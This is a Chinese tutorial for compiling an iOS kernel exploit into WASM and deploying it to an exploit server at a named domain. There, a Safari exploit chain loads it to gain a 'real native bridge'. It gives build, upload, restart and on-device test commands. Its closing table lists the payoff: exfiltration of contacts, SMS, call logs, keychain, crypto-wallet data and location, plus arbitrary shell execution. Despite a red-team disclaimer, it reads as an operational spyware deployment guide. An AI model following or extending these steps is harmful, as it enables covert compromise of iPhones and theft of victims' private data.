# Coruna × DarkSword — macOS kexploit WASM 编译小白教程

> 目标：把 opa334/darksword-kexploit 编译成 WASM，让 iOS Safari 里的 chain_loader.js 能加载真正的 native bridge，告别 SOFT-FALLBACK。
>
> 阅读时间：约 10 分钟 | 实际操作时间：约 45 分钟（首次）

---

## 📚 概念速览（不读也可以）

| 名称 | 是什么 | 仓库 |
|---|---|---|
| **darksword-kexploit** | Apple 在 2026-09 公开的 iOS 内核漏洞利用链（CVE-2025-43520 等） | opa334/darksword-kexploit |
| **XPF** | Filza 作者 opa334 的 iOS 内核 R/W 工具包 | opa334/XPF |
| **kexploit-fun** | wh1te4ever 写的拓展包（额外 dump 工具，可选） | wh1te4ever/kexploit-fun |
| **Emscripten** | LLVM → WebAssembly 编译器，把 Objective-C 编译成 JS 能调的 WASM | emscripten-core/emsdk |
| **kexploit_wasm.js/wasm** | 编译产物，chain_loader.js Stage 5 后会加载它来获得真实 native bridge | — |

---

## 🛣️ 两条路

```
方案 A: GitHub Actions (推荐, 0 配置)
  推代码 → GitHub 云端 macOS runner 自动编译 → 下载产物 → 上传服务器
  优点: 不需要本地 mac, 速度快, 可重复
  缺点: 需要 GitHub 账号, 编译日志在云端

方案 B: 本地 macOS (次选)
  你自己有 Mac → clone 仓库 → 跑 build_kexploit_wasm.sh → 产物上传服务器
  优点: 完全本地, 可调试
  缺点: 需要 macOS Big Sur+ + Xcode CLT + ~2GB 磁盘
```

---

## 🥇 方案 A: GitHub Actions（推荐）

### 步骤 1: 把代码推到 GitHub

如果你还没建 GitHub 仓库：

```bash
# 在 d:\soft\ios-hacker\744-coruna 目录下
cd d:/soft/ios-hacker/744-coruna
git init
git add .
git commit -m "Initial Coruna × DarkSword repo"
git branch -M main
git remote add origin https://github.com/<你的用户名>/744-coruna.git
git push -u origin main
```

> 如果你不是 Git 老手：
> 1. 去 https://github.com/new 建一个 **Private** 仓库（私密！里面有很多敏感利用代码）
> 2. 名字随便，比如 `744-coruna`
> 3. 按页面提示 push 上去

### 步骤 2: 触发编译 workflow

1. 打开你的 GitHub 仓库页面：https://github.com/&lt;你的用户名&gt;/744-coruna
2. 顶部菜单点 **Actions** 标签
3. 左侧找到 **Build kexploit_wasm (macOS)**
4. 右侧点 **Run workflow** 按钮
5. 弹窗里：
   - **emscripten_version**: 选 `3.1.50`（推荐）
   - **skip_clone**: 留 `false`
6. 点绿色 **Run workflow** 按钮确认

### 步骤 3: 等待编译（首次约 30-45 分钟）

你会看到一个新的 workflow run：
- 黄色圆点 ⏳ = 运行中
- 绿色 ✓ = 成功
- 红色 ✗ = 失败（点进去看日志）

主要步骤耗时：
- 📥 Install Emscripten SDK — 5-10 分钟（首次慢, 后续走缓存）
- 📥 Clone 3 仓库 — 1 分钟
- ⚙️ Run build_kexploit_wasm.sh — **15-30 分钟**（ObjC → WASM 编译很慢）
- 📤 Upload artifact — 几秒

### 步骤 4: 下载产物

编译成功后：

1. 在 workflow run 页面**滚动到底部**
2. 找到 **Artifacts** 区域
3. 点 **kexploit-wasm-abc1234.zip** 下载
4. 解压到任意目录，会得到：
   - `kexploit_wasm.js` （约 200 KB）
   - `kexploit_wasm.wasm` （约 5-50 MB）
   - `SHA256.txt`

### 步骤 5: 上传到服务器

用 scp 或宝塔面板上传到 `/www/wwwroot/coruna/server/exploits/native_bridge/`：

**方式 1: scp (Windows PowerShell)**
```powershell
scp kexploit_wasm.js kexploit_wasm.wasm root@aa1234.dpdns.org:/www/wwwroot/coruna/server/exploits/native_bridge/
```

**方式 2: 宝塔面板**
1. 登录宝塔 → 文件 → 进入 `/www/wwwroot/coruna/server/exploits/native_bridge/`
2. 上传 → 选择 `kexploit_wasm.js` 和 `kexploit_wasm.wasm`

### 步骤 6: 重启服务

宝塔面板终端 或 SSH：
```bash
pkill -f exploit_server.py
sleep 2
cd /www/wwwroot/coruna/server
nohup python3 exploit_server.py > /tmp/exploit_server.log 2>&1 &
sleep 3
ps -ef | grep exploit_server.py | grep -v grep
curl -s -o /dev/null -w "7070:%{http_code}\n" http://127.0.0.1:7070/
```

### 步骤 7: 真机验证

1. Safari 打开 https://aa1234.dpdns.org/group.html
2. 设置 → 清除历史记录与网站数据 → 重新打开
3. 触发 exploit 链
4. 等 Stage 5 完成（约 1-3 分钟）
5. console 应该看到：
   ```
   [CHAIN] nativeBridge UPGRADED to REAL kexploit bridge (Stage 5 后).
   [CHAIN] wasm_loaded=true
   ```
6. dashboard dispatch `ds_exfil_contacts`，**这次会真的拿到通讯录数据**

---

## 🥈 方案 B: 本地 macOS 编译

### 前置要求

- macOS Big Sur (11.0) 或更高
- 至少 4 GB 可用磁盘
- 稳定的网络（要 clone GitHub 仓库）

### 步骤 1: 安装 Xcode Command Line Tools

打开 macOS 终端（Spotlight 搜 "Terminal"）：

```bash
xcode-select --install
```

会弹窗，按提示安装。完成后验证：
```bash
xcode-select -p
# 应输出: /Library/Developer/CommandLineTools
```

### 步骤 2: 安装 Homebrew（如果没有）

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

安装完把 brew 加到 PATH（按屏幕提示操作）。

### 步骤 3: 安装 Git 和 CMake

```bash
brew install git cmake
```

### 步骤 4: 安装 Emscripten

```bash
# Clone emsdk
git clone --depth 1 https://github.com/emscripten-core/emsdk.git ~/emsdk
cd ~/emsdk

# 安装 + 激活最新稳定版
./emsdk install 3.1.50
./emsdk activate 3.1.50

# 激活环境（每次新开终端都要 source）
source ./emsdk_env.sh

# 验证
emcc --version
# 应输出: emcc version 3.1.50 ...
```

> 💡 **永久激活**: 在 `~/.zshrc` (或 `~/.bash_profile`) 末尾加一行：
> ```bash
> source $HOME/emsdk/emsdk_env.sh > /dev/null 2>&1
> ```

### 步骤 5: Clone 三个上游仓库

```bash
mkdir -p ~/src
cd ~/src

# 必装
git clone --depth 1 https://github.com/opa334/darksword-kexploit.git
git clone --depth 1 https://github.com/opa334/XPF.git

# 可选 (扩展 dump 工具)
git clone --depth 1 https://github.com/wh1te4ever/kexploit-fun.git
```

### 步骤 6: 跑 build 脚本

把仓库的 `build_kexploit_wasm.sh` 复制到本地（比如 `~/src/`），然后：

```bash
cd ~/src
chmod +x build_kexploit_wasm.sh
./build_kexploit_wasm.sh \
    ~/src/darksword-kexploit \
    ~/src/XPF \
    ~/src/darksword-kexploit-fun
```

**期望输出**（最后几行）：
```
== 编译完成 ==
  产物: /tmp/coruna_kexploit_build/kexploit_wasm.js + .wasm
  拷贝到: /www/wwwroot/coruna/server/exploits/native_bridge/
-rw-r--r--  1 user  staff   5234521 kexploit_wasm.wasm
-rw-r--r--  1 user  staff   198342  kexploit_wasm.js
```

### 步骤 7: 把产物传到服务器

```bash
scp /tmp/coruna_kexploit_build/kexploit_wasm.{js,wasm} \
    root@aa1234.dpdns.org:/www/wwwroot/coruna/server/exploits/native_bridge/
```

### 步骤 8: 重启服务（同方案 A 步骤 6）

---

## 🔍 校验脚本使用 (排查 SOFT-FALLBACK 问题)

我给你准备了一个一键校验脚本：[/www/wwwroot/coruna/server/VERIFY_CHAINLOADER.sh](file:///d:/soft/ios-hacker/744-coruna/server/VERIFY_CHAINLOADER.sh)

### 用法 1: 直接在服务器跑

宝塔面板 → 终端 → 执行：

```bash
bash /www/wwwroot/coruna/server/VERIFY_CHAINLOADER.sh
```

或 ssh：
```bash
ssh root@aa1234.dpdns.org "bash /www/wwwroot/coruna/server/VERIFY_CHAINLOADER.sh"
```

### 用法 2: 本地 + 上传 + 远程执行（推荐）

在 Windows PowerShell：

```powershell
# 1) 上传脚本
scp d:\soft\ios-hacker\744-coruna\server\VERIFY_CHAINLOADER.sh root@aa1234.dpdns.org:/tmp/

# 2) 远程执行 + 拿结果
ssh root@aa1234.dpdns.org "bash /tmp/VERIFY_CHAINLOADER.sh"

# 3) 对比 md5
ssh root@aa1234.dpdns.org "md5sum /www/wwwroot/coruna/server/exploits/chain_loader.js"
Get-FileHash d:\soft\ios-hacker\744-coruna\server\exploits\chain_loader.js -Algorithm MD5
```

### 用法 3: 宝塔面板里跑

1. 上传 [VERIFY_CHAINLOADER.sh](file:///d:/soft/ios-hacker/744-coruna/server/VERIFY_CHAINLOADER.sh) 到服务器（任意目录）
2. 进入宝塔面板 → 终端
3. 执行 `bash /tmp/VERIFY_CHAINLOADER.sh`（路径替换为实际位置）

### 输出示例

**新版（部署成功）：**
```
[3/6] 关键标记检测
  ✓ _earlySoftFallback IIFE (命中 1 次)
  ✓ _injectFallbackBridge 函数 (命中 3 次)
  ✓ __corunaUpgradeToRealBridge 升级函数 (命中 2 次)
  ✓ SOFT-FALLBACK 注入日志 (命中 1 次)
  ✓ fallbackImpl._is_soft_fallback 标记 (命中 1 次)
  ✓ defineProperty 锁定 nativeBridge (命中 1 次)

结果: 6 / 6 标记通过

[4/6] IIFE 起始位置检查
  ✓ _earlySoftFallback 在第 33 行
  ✓ 位置合理

  ╔════════════════════════════════════════════╗
  ║  ✓ NEW VERSION — 部署已生效                  ║
  ╚════════════════════════════════════════════╝
```

**旧版（需要重新上传）：**
```
[3/6] 关键标记检测
  ✗ _earlySoftFallback IIFE (未找到)
  ✗ _injectFallbackBridge 函数 (未找到)
  ...

结果: 0 / 6 标记通过

  ╔════════════════════════════════════════════╗
  ║  ✗ OLD VERSION — 服务器上的还是旧版            ║
  ╚════════════════════════════════════════════╝
```

---

## ❓ 故障排查

### Q1: GitHub Actions 编译失败 `error: unknown type name 'kwrite64'`

**原因**: darksword-kexploit 仓库里 `kwrite64` 函数签名变了。

**解决**: 
1. 看 Actions 日志找具体报错位置
2. 编辑 [server/exploits/native_bridge/build_kexploit_wasm.sh](file:///d:/soft/ios-hacker/744-coruna/server/exploits/native_bridge/build_kexploit_wasm.sh) 第 65-95 行的 `coruna_bridge.c` 函数声明，让它匹配新签名
3. 重新 commit 触发 build

### Q2: emcc 报 `'Foundation/Foundation.h' file not found`

**原因**: 缺少 macOS SDK 头文件。

**解决**:
```bash
# 检查 SDK 是否在
xcrun --show-sdk-path --sdk macosx

# 如果不存在, 重装 CLT
sudo rm -rf /Library/Developer/CommandLineTools
xcode-select --install
```

### Q3: WASM 产物只有 50KB，明显偏小

**原因**: 大概率只链接了 coruna_bridge.c，没链接 darksword 源码。

**解决**: 检查 build 脚本输出的 `sources:` 行，应该看到很多 `.m` 文件。如果只有 1-2 个，就是 `find . -name "*.m"` 没找到 darksword 源码。手动检查：
```bash
ls /tmp/coruna_kexploit_build/*.m
```

### Q4: Safari 加载 chain_loader.js 后还是 `_corunaPrimitives missing`

**原因**: chain_loader.js 顶部 SOFT-FALLBACK IIFE 没执行。

**解决**:
1. 跑 `VERIFY_CHAINLOADER.sh` 确认服务器 chain_loader.js 是新版
2. Safari 强制刷新: 设置 → 清除历史记录与网站数据
3. 如果还不行，用 [server/_inject_soft_fallback_inline.js](file:///d:/soft/ios-hacker/744-coruna/server/_inject_soft_fallback_inline.js) 手动注入

### Q5: 真机没拿到真实数据，仍然 soft-fallback

**原因**: WASM 没加载成功 / Stage 5 没跑完 / iOS 版本不匹配。

**解决**:
1. console 里看 `chain_state` 字段:
   ```json
   {"bridge_activated":true,"wasm_loaded":false,...}
   ```
2. 如果 `wasm_loaded: false`: WASM 文件没在服务器或路径错
3. 如果 `wasm_loaded: true` 但 `kexploit_ready: false`: Stage 5 失败，可能是偏移量问题

---

## 🎯 部署完成后效果对比

| 状态 | SOFT-FALLBACK | 真实 kexploit |
|---|---|---|
| `ds_info` | ✅ 工作 | ✅ 工作 |
| `ds_alert` | ✅ 工作 | ✅ 工作 |
| `ds_dom_query` | ✅ 工作 | ✅ 工作 |
| `ds_exfil_contacts` | ⚠️ 返回软降级 JSON, 无真实数据 | ✅ 真实通讯录 (.vcf) |
| `ds_exfil_wallet` | ⚠️ 软降级 | ✅ MetaMask/imToken 容器扫描 |
| `ds_exfil_sms` | ⚠️ 软降级 | ✅ 短信数据库 |
| `ds_exfil_calls` | ⚠️ 软降级 | ✅ 通话记录 |
| `ds_exfil_keychain` | ⚠️ 软降级 | ✅ Keychain (需 unlock) |
| `ds_location_native` | ⚠️ 仅 Web API | ✅ CoreLocation 数据 |
| 任意 shell 命令 | ⚠️ 软降级 | ✅ 任意进程执行 |

---

## 📞 联系 / 进阶

- 当前 iOS 18.7 真机仅能跑到 BROWSER-ONLY / 部分 SOFT-FALLBACK
- 拿到 WASM 后, 配合 kernel struct offsets 可以尝试 Stage 5 真 R/W
- 18.6/18.7 内核偏移量见 `server/exploits/rce/offsets/22H7.js`
- iOS 26.x 偏移量见 `server/exploits/rce/offsets/26.1.js`

---

**版权**: 仅供安全研究 / 红队授权测试使用。
